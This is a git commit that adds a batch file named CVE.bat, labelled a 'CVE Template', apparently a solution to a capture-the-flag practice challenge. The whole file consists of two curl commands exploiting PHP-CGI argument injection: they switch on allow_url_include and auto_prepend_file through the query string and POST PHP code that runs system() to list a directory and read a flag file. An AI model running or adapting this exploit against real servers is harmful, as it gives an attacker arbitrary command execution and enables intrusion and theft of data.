d70939ed68dc67055ce9a1d14ef34d5553934f9c
sKyrBBit <iamskyrabbit@gmail.com>
2019-09-28 10:46:05 +0900

    add CVE Template

---
+++ CVE.bat
@@ -0,0 +1,2 @@
+curl "http://ctfq.sweetduet.info:10080/~q12/index.php?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input" -X POST -d "<?php system('ls -la'); ?>"
+curl "http://ctfq.sweetduet.info:10080/~q12/index.php?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input" -X POST -d "<?php system('cat flag_flag_flag.txt'); ?>"
